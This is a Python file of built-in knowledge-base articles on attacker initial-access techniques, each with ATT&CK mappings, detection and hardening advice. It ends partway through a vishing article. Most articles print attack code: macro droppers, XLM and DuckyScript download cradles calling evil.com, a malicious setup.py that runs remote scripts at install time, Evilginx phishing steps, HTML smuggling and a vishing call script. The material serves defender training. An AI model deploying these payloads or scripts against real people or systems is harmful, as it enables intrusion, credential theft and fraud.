"""Built-in KB data: Offensive Security & Adversary Techniques Articles."""

# ============================================================
# COLLECTION 1: INITIAL ACCESS & SOCIAL ENGINEERING
# ============================================================

INITIAL_ACCESS = [
    {
        "title": "Phishing Campaign Anatomy — From Recon to Payload Delivery",
        "tags": ["phishing", "initial-access", "social-engineering", "T1566", "recon", "payload-delivery"],
        "content": r"""# Phishing Campaign Anatomy — From Recon to Payload Delivery

## Overview

Phishing remains the most common initial access vector in targeted intrusions. Understanding the full kill-chain — from passive reconnaissance through payload delivery and callback — allows SOC analysts to detect campaigns earlier and more reliably than waiting for endpoint alerts.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1566.001 | Phishing: Spearphishing Attachment | Initial Access |
| T1566.002 | Phishing: Spearphishing Link | Initial Access |
| T1598 | Phishing for Information | Reconnaissance |
| T1589 | Gather Victim Identity Information | Reconnaissance |
| T1583.001 | Acquire Infrastructure: Domains | Resource Development |
| T1608.001 | Stage Capabilities: Upload Malware | Resource Development |

## Phase 1 — Reconnaissance

Attackers invest significant time profiling targets before sending a single email. Techniques include:

**Open Source Intelligence (OSINT):**
```bash
# theHarvester — email and domain enumeration
theHarvester -d targetcorp.com -b google,linkedin,hunter -l 500

# LinkedIn scraping for employee names and roles
# (Often done via Sales Navigator or third-party tools like linkedin2username)
linkedin2username -c targetcorp -d targetcorp.com

# Hunter.io / Clearbit — email format discovery
curl "https://api.hunter.io/v2/domain-search?domain=targetcorp.com&api_key=KEY"

# Maltego for relationship mapping
# WHOIS, DNS, certificate transparency logs
amass enum -d targetcorp.com -passive
```

**Key intelligence gathered:**
- Employee names, job titles, and org structure
- Email format (firstname.lastname@, f.lastname@)
- Technology stack (job postings, LinkedIn, Shodan, Wappalyzer)
- Recent events (acquisitions, software rollouts, audits)
- Supplier and partner relationships

## Phase 2 — Infrastructure Setup

Attackers register lookalike domains and configure sending infrastructure weeks before the campaign:

```bash
# Domain permutations for lookalike registration
# targetcorp.com → targetc0rp.com, target-corp.com, targetcorp-secure.com

# Setting up a phishing domain with proper email authentication
# SPF record (allows sending from VPS)
# TXT "v=spf1 ip4:ATTACKER_IP ~all"

# DKIM signing (legitimises the email)
opendkim-genkey -t -s mail -d targetcorp-secure.com

# DMARC (set to none to avoid blocking)
# TXT "v=DMARC1; p=none; rua=mailto:dmarc@targetcorp-secure.com"

# GoPhish — open-source phishing framework
./gophish &
# Access admin panel at https://127.0.0.1:3333

# Evilginx3 — adversary-in-the-middle phishing proxy (captures credentials AND session cookies)
evilginx -p ./phishlets
evilginx> phishlets hostname microsoft targetcorp-secure.com
evilginx> phishlets enable microsoft
evilginx> lures create microsoft
evilginx> lures get-url 0
```

## Phase 3 — Email Crafting

Effective spearphishing emails use:
- **Urgency/authority**: "Immediate action required — IT Security"
- **Contextual relevance**: Reference a real project, vendor, or current event
- **Minimal text, plausible sender**: Short body, matches expected communication style
- **Low-suspicion call to action**: "Review the attached invoice" vs "Click here to hack yourself"

**Common pretexts:**
| Pretext | Target Audience | Payload Type |
|---|---|---|
| Shared invoice from supplier | Finance / AP team | Macro-enabled Excel |
| DocuSign document pending | All staff | Credential harvesting link |
| IT password expiry warning | All staff | AITM proxy link |
| Benefits enrollment update | HR / general staff | Macro-enabled Word |
| Job application | HR / Talent team | PDF + macro DOCX |
| Software license renewal | IT / Procurement | LNK dropper |

## Phase 4 — Payload Delivery

Payloads are chosen based on the target environment:

```powershell
# Stage 1: Macro in Office document → downloads stage 2
# Typical VBA dropper (simplified)
Sub AutoOpen()
    Dim url As String
    url = "https://cdn.targetcorp-secure.com/update.exe"
    Dim path As String
    path = Environ("TEMP") & "\\svchost32.exe"
    ' Download and execute
    CreateObject("WScript.Shell").Run "powershell -w hidden -c ""(New-Object Net.WebClient).DownloadFile('" & url & "','" & path & "'); Start-Process '" & path & "'"" "
End Sub

# Modern alternative: ISO/LNK chain (bypasses Mark-of-the-Web)
# User mounts ISO → sees only shortcut → LNK executes hidden payload
# LNK target: C:\\Windows\\System32\\cmd.exe /c start \\\\attacker\\share\\payload.dll
```

## Detection Opportunities

### Email Gateway / SIEM
```
# Newly registered domains (< 30 days) sending email
# SPF/DKIM/DMARC failures combined with executive impersonation
# Emails with mismatched Reply-To vs From headers
# Base64-encoded URLs in email bodies
# Attachments: .docm, .xlsm, .iso, .img, .lnk, .hta, .wsf
```

### Endpoint (EDR/Sysmon)
- `WINWORD.EXE` or `EXCEL.EXE` spawning `cmd.exe`, `powershell.exe`, `wscript.exe`, `mshta.exe`
- Office processes making outbound network connections
- Files written to `%TEMP%` by Office processes
- Event ID 4688 / Sysmon Event ID 1: suspicious child processes of Office apps
- Mark-of-the-Web bypass: files extracted from ISO/IMG containers without Zone.Identifier ADS

### Network
- DNS queries for newly registered domains shortly after email delivery
- HTTP(S) GET to domains with high entropy names or non-standard TLDs
- Connections to hosting providers (DigitalOcean, Vultr, Linode) from workstations

## Prevention & Hardening

1. **Disable macros** by Group Policy (`Block macros from running in Office files from the Internet`)
2. **Attack Surface Reduction (ASR) rules** — block Office from creating child processes
3. **Email authentication**: Enforce DMARC `p=reject` for your sending domain
4. **Sandbox analysis**: Integrate email sandbox (e.g., Cofense, Proofpoint TAP) — auto-detonate attachments
5. **User awareness training**: Simulated phishing with immediate feedback
6. **URL rewriting**: All links in email rewritten through proxy for time-of-click analysis
7. **Disable ISO auto-mount**: via Group Policy or registry
""",
    },
    {
        "title": "Spearphishing Attachments — Macro-Enabled Documents, ISO/LNK Chains",
        "tags": ["spearphishing", "macros", "lnk", "iso", "T1566.001", "initial-access", "maldoc"],
        "content": r"""# Spearphishing Attachments — Macro-Enabled Documents, ISO/LNK Chains

## Overview

Spearphishing attachments weaponise document formats to execute code when a targeted user opens the file. As macro-enabled Office documents have become better-defended, attackers have pivoted to ISO/LNK chains, HTML smuggling, and OneNote attachments to bypass security controls.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1566.001 | Phishing: Spearphishing Attachment | Initial Access |
| T1204.002 | User Execution: Malicious File | Execution |
| T1059.001 | PowerShell | Execution |
| T1218.011 | Rundll32 | Defense Evasion |
| T1553.005 | Subvert Trust Controls: Mark-of-the-Web | Defense Evasion |

## Technique 1 — Macro-Enabled Office Documents

### How it works

VBA macros in `.docm`, `.xlsm`, and `.xlam` files execute when the document is opened and macros are enabled. The macro typically serves as a first-stage dropper or loader.

```vba
' Classic Meterpreter dropper via PowerShell
Sub AutoOpen()
    Dim payload As String
    payload = "powershell -nop -w hidden -enc " & Base64Encode(shellcode)
    Shell "cmd /c " & payload, vbHide
End Sub

' Template injection variant — macro hosted remotely
' Malicious .dotm template injected via docx's word/_rels/settings.xml.rels
' <Relationship Target="https://evil.com/template.dotm" Type=".../attachedTemplate"/>
```

### XLSB (Excel Binary)
XLSB files are harder to inspect than XLSX (binary format, not ZIP/XML). Security tools that parse OOXML may miss macros embedded in XLSB.

### XLM Macro 4.0
Legacy Excel 4.0 macros stored in worksheet cells (not VBA). Historically evaded many AV products:
```
=EXEC("powershell -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/rev.ps1')")
=HALT()
```

## Technique 2 — ISO / IMG + LNK Chain

Microsoft's 2022 change to block macros from internet-sourced documents drove attackers to container formats. ISO and IMG files are mounted as virtual drives — files extracted from them do **not** receive the `Zone.Identifier` Alternate Data Stream (Mark-of-the-Web), bypassing macro block policies.

```
Delivery chain:
Email attachment: invoice_2025.iso
  └── Mounted as drive letter (e.g., E:\)
       ├── invoice_2025.lnk   (visible — user clicks this)
       └── payload.dll        (hidden — executed by LNK)

LNK target:
C:\Windows\System32\cmd.exe /c rundll32.exe payload.dll,StartW
```

**Forensic note:** LNK files contain rich metadata — volume serial number, MAC address, creation timestamps of the original machine. Parse with:
```bash
# lnk-parser (Python)
python lnk-parser.py invoice_2025.lnk

# LECmd (Eric Zimmerman tools)
LECmd.exe -f invoice_2025.lnk --csv output.csv
```

## Technique 3 — HTML Smuggling

HTML attachments use JavaScript `Blob` objects to construct and download a file client-side, bypassing perimeter email scanners that look for malicious attachments by MIME type:

```html
<script>
  // Build the payload bytes client-side — scanner sees no attachment
  var data = [0x4D, 0x5A, ...]; // MZ header bytes
  var blob = new Blob([new Uint8Array(data)], {type: 'application/octet-stream'});
  var a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = 'invoice.exe';
  document.body.appendChild(a);
  a.click();
</script>
```

## Technique 4 — OneNote (.one) Attachments

Microsoft OneNote files can embed any file type. When users double-click an embedded file, Windows executes it with a weak warning dialog. Used widely in 2023 Qakbot/IcedID campaigns:

```
invoice.one
  └── Embedded: invoice.hta (or .bat, .cmd, .js, .vbs, .exe)
      → Executes immediately on double-click
```

## Detection Opportunities

### Process Relationships (Sysmon Event ID 1 / Windows Event 4688)
```
ParentImage: WINWORD.EXE, EXCEL.EXE, ONENOTE.EXE
ChildImage: cmd.exe, powershell.exe, mshta.exe, wscript.exe, cscript.exe, regsvr32.exe, rundll32.exe
```

### File System (Sysmon Event ID 11)
- Files created in `%TEMP%`, `%APPDATA%`, `%PUBLIC%` by Office processes
- `.dll`, `.exe`, `.ps1` dropped by `WINWORD.EXE`

### Network (Sysmon Event ID 3 / DNS Event ID 22)
- Outbound connections from Office processes
- DNS queries immediately after document open

### ISO/LNK Specific
```kql
// Sysmon: process launched from mounted ISO (drive letter not C: or D:)
event.code: "1" AND
process.parent.name: "explorer.exe" AND
process.executable: /[E-Z]:\\/
```

### AMSI / Script Block Logging (Event ID 4104)
- Encoded PowerShell commands (`-enc`, `-EncodedCommand`)
- `IEX`, `Invoke-Expression`, `DownloadString` patterns

## Prevention

1. **Group Policy**: `User Configuration > Administrative Templates > Microsoft Word > Block macros from running in Office files from the internet`
2. **ASR Rule**: `Block all Office applications from creating child processes` (GUID: `d4f940ab-401b-4efc-aadc-ad5f3c50688a`)
3. **Disable ISO auto-mount**: `HKLM\SYSTEM\CurrentControlSet\Services\cdrom\AutoRun = 0`
4. **Block .one attachments** at email gateway or strip embedded content
5. **Script Block Logging + AMSI**: Enable for PowerShell detection
6. **Protected View**: Ensure internet-sourced documents open in Protected View (default, but GPO can override)
""",
    },
    {
        "title": "Watering Hole Attacks — Browser Exploits and Drive-By Downloads",
        "tags": ["watering-hole", "browser-exploit", "drive-by", "T1189", "initial-access", "exploit"],
        "content": r"""# Watering Hole Attacks — Browser Exploits and Drive-By Downloads

## Overview

A watering hole attack compromises a website frequented by the target population, then serves malicious content (exploit code, credential harvesters, or malware) to visitors. Unlike phishing, the attack comes *to* the target passively — the victim just browses a trusted site.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1189 | Drive-by Compromise | Initial Access |
| T1203 | Exploitation for Client Execution | Execution |
| T1059.007 | JavaScript | Execution |
| T1176 | Browser Extensions | Persistence |
| T1185 | Browser Session Hijacking | Collection |

## Attack Chain

```
1. Attacker profiles target industry/geography
2. Identify websites targets commonly visit (trade associations, forums, gov portals)
3. Compromise target website (SQL injection, CMS vuln, supply chain — CDN/ad network)
4. Inject malicious JavaScript or redirect to exploit kit
5. Visitor loads page → exploit code runs → payload delivered
6. Beacon established back to C2
```

## Website Compromise Techniques

```bash
# Identify CMS and plugins for known CVEs
whatweb https://industry-forum.org
wpscan --url https://industry-forum.org --enumerate vp,vt,u

# Common entry points
# - Outdated WordPress plugins (CVE-rich targets: Revolution Slider, Contact Form 7)
# - SQL injection → file write → webshell
sqlmap -u "https://site.com/page?id=1" --os-shell

# Supply chain: compromise CDN-hosted JS library
# Inject payload into analytics, chat widgets, tag managers
```

## Exploit Kit Infrastructure

Modern exploit kits (Angler, RIG, Magnitude, Fallout) follow a standardised architecture:

```
Landing Page → Gate → Exploit Server → Payload Server

Gate function: fingerprints visitor (browser, plugins, OS, IP)
             filters out researchers (Tor, VPNs, sandboxes, known AV IPs)
             serves different content based on profile
```

**Browser exploit delivery (JavaScript):**
```javascript
// Fingerprinting before exploit
var ua = navigator.userAgent;
var chrome_version = parseInt(ua.match(/Chrome\/(\d+)/)[1]);

// CVE-2021-21224 style — Chrome V8 type confusion
// (Simplified representation — real exploits are heavily obfuscated)
if (chrome_version >= 90 && chrome_version <= 91) {
    loadExploit('chrome_v8_type_confusion.js');
} else if (isIE()) {
    loadExploit('ie_jscript9.js');
}

// Heap spray to position shellcode
var spray = unescape("%u9090%u9090");
while (spray.length < 0x40000) spray += spray;
```

## Drive-By Downloads Without Exploitation

Not all watering holes exploit vulnerabilities. Some abuse legitimate browser behaviour:

**Social engineering overlays:**
```javascript
// Fake Chrome update overlay — steals credentials or delivers payload
document.body.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:9999">' +
  '<h1>Critical Chrome Update Required</h1>' +
  '<a href="https://evil.com/ChromeUpdate.exe">Update Now</a></div>';
```

**Malvertising:** Attacker buys ad space on ad network → ad creative contains exploit or redirect → reaches millions of users across legitimate sites.

## Detection Opportunities

### Proxy / Web Gateway Logs
```kql
// Redirects to known exploit kit patterns
url.path: /gate/ OR url.path: /land/ OR url.path: /flow/

// Requests to domains < 7 days old from internal hosts
// (correlate DNS with domain registration data)

// Abnormal content-type: application/octet-stream from .js or .html response
http.response.mime_type: "application/octet-stream" AND http.request.extension: ("js" OR "html")
```

### Endpoint / EDR
- Browser process (`chrome.exe`, `msedge.exe`, `firefox.exe`) spawning `cmd.exe`, `powershell.exe`, or `wscript.exe`
- Browser process writing executable files to disk
- Heap spray signatures in memory scans

### Network
- Redirect chains (HTTP 302 cascades to multiple domains)
- Requests to domains with high entropy names
- Download of PE files with incorrect or missing `Content-Disposition` headers

## Prevention

1. **Browser isolation** (Menlo, Zscaler RBI): Execute remote content in cloud sandbox, stream pixels to user
2. **Patch browsers aggressively** — most drive-by exploits target N-1 and N-2 browser versions
3. **Script blocking / NoScript**: Reduce JavaScript attack surface
4. **DNS filtering**: Block newly registered and uncategorised domains
5. **Outbound proxy with HTTPS inspection**: Visibility into encrypted exploit traffic
6. **Enable renderer sandboxing**: Chromium sandbox limits exploit impact even if code executes
""",
    },
    {
        "title": "Credential Harvesting — Fake Login Pages, OAuth Token Theft",
        "tags": ["credential-harvesting", "phishing", "oauth", "T1056", "T1528", "aitm"],
        "content": r"""# Credential Harvesting — Fake Login Pages, OAuth Token Theft

## Overview

Credential harvesting attacks steal usernames/passwords or authentication tokens rather than deploying malware. Modern variants bypass MFA by capturing session cookies (Adversary-in-the-Middle) or abusing OAuth consent flows.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1056.003 | Input Capture: Web Portal Capture | Collection |
| T1528 | Steal Application Access Token | Credential Access |
| T1539 | Steal Web Session Cookie | Credential Access |
| T1111 | Multi-Factor Authentication Interception | Credential Access |
| T1550.001 | Use Alternate Authentication Material: Application Access Token | Lateral Movement |

## Technique 1 — Classic Fake Login Pages

```bash
# GoPhish — credential capture server
# Create landing page cloning Microsoft 365 login
./gophish

# SET (Social Engineering Toolkit) — clone any website
setoolkit
> 2 (Website Attack Vectors)
> 3 (Credential Harvester Attack Method)
> 2 (Site Cloner)
> Enter URL to clone: https://login.microsoftonline.com
```

Credentials posted to attacker's server, then victim redirected to real login to avoid suspicion.

## Technique 2 — Adversary-in-the-Middle (AITM) / MFA Bypass

AITM proxies sit between the victim and the real identity provider, relaying traffic in real time and capturing the authenticated session cookie.

```bash
# Evilginx3 — production-quality AITM framework
# Supports phishlets for: Microsoft 365, Google, GitHub, LinkedIn, Okta, etc.
evilginx -p /usr/share/evilginx/phishlets/

evilginx> phishlets hostname microsoft o365-secure.targetcorp.com
evilginx> phishlets enable microsoft
evilginx> lures create microsoft
evilginx> lures get-url 0
# Output: https://o365-secure.targetcorp.com/AbCdEf

# Victim clicks link → authenticates to real Microsoft 365 through proxy
# Evilginx captures: username, password, MFA code, AND session cookie
# Attacker replays session cookie → authenticated without MFA
```

**Modlishka** — alternative AITM tool:
```bash
./modlishka -phishing targetcorp-login.com -target login.microsoftonline.com -cert cert.pem -certKey key.pem
```

## Technique 3 — OAuth Device Code Phishing

Abuses the OAuth 2.0 Device Authorization Grant flow:

```
1. Attacker initiates device code flow for Microsoft 365:
   POST https://login.microsoftonline.com/{tenant}/oauth2/v2.0/devicecode
   → Response: {device_code, user_code: "ABCD-EFGH", verification_uri}

2. Attacker sends victim a convincing email:
   "Please visit https://microsoft.com/devicelogin and enter code ABCD-EFGH
    to authorise your new workstation"

3. Victim logs in with MFA at legitimate Microsoft URL

4. Attacker polls the token endpoint:
   POST https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token
   grant_type=urn:ietf:params:oauth:grant-type:device_code
   device_code=<device_code>

5. Attacker receives access token + refresh token → persistent access
```

## Technique 4 — Malicious OAuth App Consent

```
1. Attacker registers OAuth app in Azure AD (free)
2. App requests permissions: Mail.ReadWrite, Contacts.Read, Files.ReadWrite.All
3. Phishing email sends "Log in with Microsoft" link
4. Victim authenticates legitimately and clicks "Accept"
5. Attacker receives OAuth token with consented permissions
6. No password captured — but persistent access to mailbox/OneDrive
```

Detection of malicious OAuth app consent:
```kql
// Azure AD Sign-In Logs — consent to third-party apps
AuditLogs
| where OperationName == "Consent to application"
| where TargetResources[0].modifiedProperties has "ConsentContext.IsAdminConsent:false"
| project TimeGenerated, InitiatedBy, TargetResources
```

## Detection Opportunities

### Identity / AAD Logs
- Sign-in from unusual location immediately after credential submission
- Token replay: same session token used from two different IPs
- Device code flow (`grant_type=device_code`) from non-standard applications
- OAuth consent granted to newly registered application

### Email Gateway
- Links to AITM infrastructure: domains containing `microsoftonline`, `login-`, `secure-` with low reputation
- URLs redirecting through multiple hops before reaching a login page

### Endpoint
- Browser password autofill on unexpected domains (EDR telemetry)
- Evilginx server fingerprint: specific TLS cipher suites, certificate patterns

## Prevention

1. **Phishing-resistant MFA**: FIDO2/WebAuthn hardware keys (YubiKey) — cannot be replayed by AITM proxy
2. **Conditional Access — compliant device requirement**: Even with valid token, enforce device compliance check
3. **Disable legacy authentication protocols**: Block basic auth at Exchange and AAD
4. **OAuth app consent policies**: Require admin approval for third-party app consent
5. **Token lifetime reduction**: Shorter access token lifetimes limit post-compromise window
6. **User awareness**: Educate on device code phishing — Microsoft never asks for device codes via email
""",
    },
    {
        "title": "Supply Chain Compromise — Package Typosquatting, Dependency Confusion",
        "tags": ["supply-chain", "typosquatting", "dependency-confusion", "T1195", "npm", "pypi"],
        "content": r"""# Supply Chain Compromise — Package Typosquatting, Dependency Confusion

## Overview

Supply chain attacks target the software development and distribution pipeline rather than attacking the final target directly. Compromising a trusted package or build system can deliver malware to thousands of organisations simultaneously.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1195.001 | Compromise Software Dependencies and Development Tools | Initial Access |
| T1195.002 | Compromise Software Supply Chain | Initial Access |
| T1554 | Compromise Host Software Binary | Persistence |
| T1072 | Software Deployment Tools | Lateral Movement |

## Technique 1 — Package Typosquatting

Attacker publishes a malicious package with a name similar to a popular legitimate one:

```
Legitimate: requests        → Malicious: request (no s)
Legitimate: urllib3         → Malicious: urlib3
Legitimate: beautifulsoup4  → Malicious: beatifulsoup4
Legitimate: lodash          → Malicious: loadash
```

**Typosquatting payload example (Python):**
```python
# setup.py in malicious PyPI package — runs at install time
from setuptools import setup
import subprocess, os, platform

def post_install():
    if platform.system() == "Windows":
        subprocess.Popen(["powershell", "-w", "hidden", "-c",
            "IEX(New-Object Net.WebClient).DownloadString('https://evil.com/win.ps1')"],
            creationflags=0x08000000)
    else:
        os.system("curl -s https://evil.com/lin.sh | bash")

post_install()

setup(name='request', version='2.28.2', ...)
```

**Installation triggers execution:**
```bash
pip install request  # typo of 'requests'
# Code in setup.py / install_requires hooks executes immediately
```

## Technique 2 — Dependency Confusion

Discovered by Alex Birsan (2021). Private internal packages have names like `company-utils`. Public registries (npm, PyPI) have no package with that name. Attacker publishes a public package with the same name but higher version number.

```bash
# Attacker uploads 'company-utils' to npm with version 9.9.9
# Target's package manager (npm, pip) checks public registry first
# or has misconfigured registry priority

# Affected registries: npm, PyPI, RubyGems, NuGet
# The package manager pulls attacker's public package instead of internal one

# How to identify internal package names:
# - package-lock.json, requirements.txt, pom.xml in public GitHub repos
# - Error messages in bug trackers
# - Job postings mentioning internal tools
# - GitHub dorks: "filename:package.json company-internal"
```

**Detection of dependency confusion attack:**
```bash
# Check if your internal package names are claimed on public registries
pip index versions your-internal-package-name
npm view your-internal-package-name

# Use private registry namespacing to prevent:
# npm: use scoped packages @company/package-name
# pip: use --index-url pointing only to private registry
# Nexus/Artifactory: configure upstream proxy with exclusion rules
```

## Technique 3 — CI/CD Pipeline Compromise

```yaml
# Malicious GitHub Action (typosquatted action name)
# Legitimate: actions/checkout@v3
# Malicious: action/checkout@v3 (missing 's')

# In compromised workflow:
- uses: malicious/exfil-secrets@v1
  # This action reads all env vars including secrets and exfiltrates them
```

**SolarWinds-style build system compromise:**
```
Attacker gains access to build system → injects malicious code into source →
Code compiled into signed binary → distributed to customers via legitimate update
```

## Detection Opportunities

### Package Registry Monitoring
```bash
# Monitor for new packages with names similar to yours
# Use service like Socket.dev, Snyk, or Sonatype Nexus Firewall

# Hash pinning in requirements.txt:
requests==2.31.0 --hash=sha256:58cd2187423839...

# npm lockfile integrity:
# package-lock.json contains integrity hashes for all packages
npm audit
npm ci  # uses lockfile exactly, fails on hash mismatch
```

### Build System / CI Pipeline
- Unexpected outbound network connections from build agents
- New packages appearing in `node_modules`, `site-packages` outside of approved PRs
- Pipeline steps with unusual environment variable access patterns

### Endpoint
- `pip.exe`, `npm.exe` spawning shells or making outbound connections
- Files created in `%TEMP%` immediately after package installation

## Prevention

1. **Pin exact versions with hash verification** in all dependency files
2. **Use private package mirrors** with allowlists of approved packages
3. **Namespace all internal packages** (`@company/`, `.companyinternal`) and claim those names on public registries
4. **Software Composition Analysis (SCA)**: Snyk, OWASP Dependency-Check, GitHub Dependabot
5. **Evaluate new dependencies**: Code review for `setup.py`, `postinstall` scripts, `__init__.py` network calls
6. **Immutable builds**: Lock all dependencies, verify hashes before building
7. **Sign build artifacts**: Sigstore/cosign for containers, Authenticode for Windows binaries
""",
    },
    {
        "title": "USB Drop Attacks — Rubber Ducky, BadUSB, and Physical Social Engineering",
        "tags": ["usb", "badusb", "rubber-ducky", "T1091", "physical", "social-engineering", "HID"],
        "content": r"""# USB Drop Attacks — Rubber Ducky, BadUSB, and Physical Social Engineering

## Overview

USB-based attacks exploit human curiosity and device trust. From the classic "dropped USB in car park" to sophisticated BadUSB devices that impersonate keyboards, these attacks bypass network-layer controls entirely.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1091 | Replication Through Removable Media | Lateral Movement / Initial Access |
| T1200 | Hardware Additions | Initial Access |
| T1059.001 | Command and Scripting Interpreter: PowerShell | Execution |
| T1547.001 | Boot or Logon Autostart: Registry Run Keys | Persistence |

## Technique 1 — Dropped USB (Classic)

Studies consistently show 45–60% of dropped USB drives are plugged in. Attack payloads range from AutoRun malware to files that appear to contain juicy data (payroll, HR, confidential) which actually drop malware when opened.

**Autorun.inf abuse (legacy, Windows XP–7):**
```ini
[AutoRun]
open=payload.exe
action=Open Folder to View Files
icon=folder.ico
```

**Modern variant — LNK pointing to USB payload:**
```powershell
# Create convincing LNK on USB pointing to hidden payload
# User sees "Payroll_2025.xlsx.lnk" → runs payload → opens real Excel to avoid suspicion
$lnk = (New-Object -ComObject WScript.Shell).CreateShortcut("E:\Payroll_2025.xlsx.lnk")
$lnk.TargetPath = "C:\Windows\System32\cmd.exe"
$lnk.Arguments = '/c powershell -w hidden -c "IEX(gc E:\payload.ps1 -Raw)"'
$lnk.IconLocation = "C:\Windows\System32\imageres.dll,2"
$lnk.Save()
```

## Technique 2 — Rubber Ducky / HID Attacks

The USB Rubber Ducky (Hak5) enumerates as a USB keyboard (HID — Human Interface Device). The OS trusts it completely and executes every keystroke at ~1000 WPM. No malware required — just scripted keystrokes.

```ducky
# Rubber Ducky payload (DuckyScript) — Windows reverse shell
DELAY 500
GUI r
DELAY 200
STRING powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('https://evil.com/rev.ps1')"
ENTER
```

**Bash Bunny** — more capable device, appears as Ethernet adapter, keyboard, and mass storage simultaneously:
```bash
# Bash Bunny payload (runs as root on embedded Linux)
# Switch position 1: HID attack
ATTACKMODE HID
LED ATTACK
RUN WIN powershell -nop -w hidden "IEX(New-Object Net.WebClient).DownloadString('http://c2.evil.com/payload.ps1')"
LED FINISH
```

**O.MG Cable** — appears as a standard USB-C charging cable but contains a hidden WiFi-accessible implant. Looks identical to legitimate cables.

## Technique 3 — Firmware-Level BadUSB

Demonstrated by Karsten Nohl (2014): most USB controller firmware is reprogrammable. A standard USB flash drive can be reflashed to impersonate any USB device class.

```
Flash drive → reprogrammed firmware → appears as:
  - USB keyboard (HID) — types commands
  - USB network adapter — routes traffic through attacker server
  - USB CDROM — AutoRun payload
  - Combination of the above
```

**Detection challenge:** OS-level antivirus cannot scan firmware. Standard USB scanning won't detect a keyboard that types malicious commands.

## Technique 4 — Physical Social Engineering

Scenarios used to deliver USB devices:
- **Car park drop**: 50+ USBs scattered around target company car park
- **Courier delivery**: Fake DHL package containing "promotional" USB sent to reception
- **Conference swag**: Branded USB sticks at industry events (real-world examples: IBM/Procter & Gamble)
- **Charging station**: Public USB charging ports modified to add HID/data lines
- **Mouse/keyboard swap**: Physical access during "vendor visit" to swap legitimate peripheral with BadUSB

## Detection Opportunities

### Windows Event Logs
```
Event ID 6416 — New external device recognised (System log)
  → DeviceDescription, HardwareId, ClassGuid

Event ID 2003/2100 — Device installation (Setup log)

# Detect HID devices (keyboards) being added unexpectedly
# Alert on: VID/PID combinations known for Rubber Ducky
# Hak5 USB Rubber Ducky: VID_03EB (Atmel), later versions use VID_2B04
```

### EDR / Endpoint
- Keystroke injection: rapid burst of keystrokes (>500/min) immediately after device connection
- `powershell.exe` spawned within 3 seconds of USB device event
- New USB device + execution of script/binary within 30-second window

### UEBA / Behaviour Analytics
- USB insertion at unusual time (after hours, weekend)
- First-ever USB insertion on sensitive system (SCADA, jump server, air-gapped)

## Prevention

1. **Disable USB ports via Group Policy / SCCM**: `HKLM\SYSTEM\CurrentControlSet\Services\USBSTOR\Start = 4`
2. **USB device allowlisting** (endpoint DLP: McAfee, Symantec, Ivanti): Only authorised vendor/product IDs permitted
3. **Physical USB port blockers**: Keyed port locks for unused ports on sensitive machines
4. **Disable AutoRun/AutoPlay**: GPO `Turn off AutoPlay` — all drives
5. **HID attack prevention**: `USBGuard` (Linux) — block HID devices after initial pairing window
6. **Secure areas**: Escort visitors, CCTV coverage of workstations, clean-desk policy
7. **User awareness**: Educate that found USB drives should go directly to IT security, not workstations
""",
    },
    {
        "title": "Vishing and Pretexting — Voice-Based Social Engineering",
        "tags": ["vishing", "pretexting", "social-engineering", "T1598", "phone", "voice"],
        "content": r"""# Vishing and Pretexting — Voice-Based Social Engineering

## Overview

Vishing (voice phishing) uses telephone calls to manipulate targets into disclosing credentials, transferring money, or granting system access. Pretexting is the broader technique of establishing a false identity or scenario. These attacks are highly effective because they bypass all technical controls and exploit human trust.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1598.004 | Phishing for Information: Spearphishing Voice | Reconnaissance |
| T1566.004 | Phishing: Spearphishing Voice | Initial Access |
| T1656 | Impersonation | Defence Evasion |

## Common Pretexts

| Pretext Persona | Target | Goal |
|---|---|---|
| IT helpdesk | General staff | Password reset, MFA bypass |
| Senior executive (CEO fraud) | Finance / EA | Wire transfer, W-2 data |
| Microsoft/vendor support | IT staff | Remote access (TeamViewer/AnyDesk) |
| Bank fraud team | Finance | Account credentials |
| Government / law enforcement | Management | Urgent compliance action |
| Recruiter | Engineers | Technology disclosure |

## Attack Methodology

### Phase 1 — Target Research
```
LinkedIn: employee names, direct phone numbers, job titles, org chart
LinkedIn > "works at TargetCorp" > "IT Helpdesk" > find real helpdesk employee names

Corporate website: about us, leadership team, press releases

Phone directory:
  - Call main reception: "Can I speak to your IT helpdesk?"
  - Note hold music, department names, greetings (used later for authenticity)

Caller ID spoofing:
  SpoofCard, Twilio (programmable), VoIP providers
  → Display as internal extension or known vendor number
```

### Phase 2 — Pretext Establishment
```
Example pretext: IT helpdesk calling about "suspicious login activity"

Attacker: "Hi Sarah, this is Mark from IT Security. I'm seeing some unusual sign-in
attempts on your account from a location in Eastern Europe. I need to verify your
identity before we lock the attacker out. Can you confirm your employee ID and the
last application you logged into?"

→ Victim provides: employee ID, confirms last app (intel for further attack)
→ "Great. Now I'm going to send a verification code to your phone — read it back
  to me and I'll lock that session."
→ Victim reads MFA code → attacker uses it in real time
```

### Phase 3 — Execution
```
Credential reset via vishing:
1. Call IT helpdesk impersonating target employee
2. Claim: "I've lost access to my account, I'm on-site but can't login"
3. Social pressure: "My director is waiting for this report"
4. IT helpdesk resets password → attacker receives reset link via social engineering

Or: impersonate IT helpdesk calling employee
1. "We need to apply a security patch — I'm sending you a link to our remote access tool"
2. Employee installs AnyDesk/TeamViewer
3. Attacker has full remote control
```

## Real-World Examples

- **Twitter 2020 hack**: Attackers called Twitter employees impersonating internal IT. Gained access to admin panel → compromised high-profile accounts (Obama, Biden, Musk). Yielded $120k in Bitcoin.
- **MGM Resorts 2023**: ALPHV/Scattered Spider called MGM's IT helpdesk, impersonated an employee found on LinkedIn. Single call led to $100M+ in losses.
- **Uber 2022**: Attacker texted and called an employee claiming to be IT, used MFA fatigue + vishing to gain VPN access.

## Detection Opportunities

### Call Recording / SIEM
- Helpdesk tickets for password resets without corresponding prior incident reports
- Password resets followed immediately by login from new IP/device
